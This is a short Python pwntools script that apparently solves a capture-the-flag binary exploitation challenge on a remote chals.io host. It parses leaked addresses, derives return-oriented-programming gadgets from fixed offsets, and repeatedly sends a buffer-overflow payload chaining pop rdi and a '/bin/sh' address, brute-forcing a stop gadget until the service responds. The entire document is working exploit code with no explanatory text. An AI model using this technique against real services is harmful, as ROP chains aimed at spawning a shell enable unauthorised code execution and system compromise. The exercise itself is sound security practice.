from pwn import *

for i in range(33, 0x1000): 
    target = remote('0.cloud.chals.io', 21978)

    context.arch = "amd64"

    frame = SigreturnFrame()

    print(target.recvuntil(b'Push your way to /bin/sh at :'))

    leak = (target.recvline())
    print(leak)
    binsh = int(leak, 16)
    print('binsh is at', hex(binsh))

    payload = b'Y' 
    target.send(payload)


    print(target.recvuntil(b'Would you like another push (Y/*) >>>'))
    target.sendline(b'Y')

    print(target.recvuntil(b'Would you like another push (Y/*) >>>'))
    target.sendline(b'Y')
    print(target.recvuntil(b'~ push 0x58585858; ret |'))
    leak = (target.recvline())
    print(leak)

    pop_rax = int(leak, 16) + 4

    print('pop rax ret at ', hex(pop_rax))

    print(target.recvuntil(b'Would you like another push (Y/*) >>>'))
    target.sendline(b'Y')
    print(target.recvuntil(b'~ push 0x0f050f05; ret |'))
    leak = (target.recvline())
    print(leak)
    syscall = int(leak, 16) + 2

    print('syscall at', hex(syscall))

    padding = b'a' * 16 
    stop_gadget = pop_rax - 0x1c4 + 144
    pop_rdi = pop_rax - 0x1c4 + 923
    pop_rsi_r15 = pop_rax - 0x1c4 + 921
    test_address = pop_rax - 0x1c4 + i
    
    payload = padding + p64(pop_rdi) + p64(binsh) + p64(stop_gadget)
    print(target.recvuntil(b'(Y/*) >>>'))
    target.sendline(payload)
    result = target.recvall(timeout=1)
    print(result)
    if len(result) >= 2:
        print('winner')
        print(hex(test_address))
        print(i)
        target.close()
        break
    print('i is', i)
    target.close()

